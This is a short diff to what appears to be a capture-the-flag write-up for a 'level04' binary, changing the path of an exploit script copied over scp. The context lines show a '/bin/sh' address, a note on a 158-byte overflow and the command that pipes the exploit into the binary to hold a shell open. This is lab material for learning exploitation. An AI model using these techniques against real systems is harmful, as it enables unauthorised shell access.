@@ -24,7 +24,7 @@ we send 158 symbols to input, which resulted in segmentation, in the end of addr
 0xf7f897ec  '/bin/sh'
 
 copy python script from local machine to remote
-$ scp -P 4242 ./level04/exploit.py level04@localhost:/tmp/
+$ scp -P 4242 ./level04/Resources/exploit.py level04@localhost:/tmp/
 
 $ (python /tmp/exploit.py ; cat - ) | ./level04
 Give me some shellcode, k
